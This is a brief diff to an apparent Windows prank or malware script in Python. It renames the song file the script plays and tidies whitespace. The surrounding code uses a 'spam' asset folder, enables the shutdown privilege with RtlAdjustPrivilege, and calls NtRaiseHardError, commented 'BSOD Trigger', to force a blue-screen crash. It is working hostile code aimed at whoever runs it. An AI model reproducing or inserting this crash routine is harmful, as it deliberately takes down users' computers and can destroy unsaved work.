@@ -15,7 +15,7 @@ def play_audio(path):
     windll.winmm.mciSendStringW('play bgm repeat', None, 0, 0)
 
 def main():
-    song_path = get_asset_path("assets/song.mp3")
+    song_path = get_asset_path("assets/we-are-charlie-kirk-song.mp3")
     spam_dir = get_asset_path("assets/spam")
 
     if song_path.exists():
@@ -31,14 +31,14 @@ def main():
 
     nullptr = POINTER(c_int)()
     windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
-    
+
     # BSOD Trigger
     windll.ntdll.NtRaiseHardError(
-        c_ulong(0xc000007B), 
-        c_ulong(0), 
-        nullptr, 
-        nullptr, 
-        c_uint(6), 
+        c_ulong(0xc000007B),
+        c_ulong(0),
+        nullptr,
+        nullptr,
+        c_uint(6),
         byref(c_uint())
     )
 
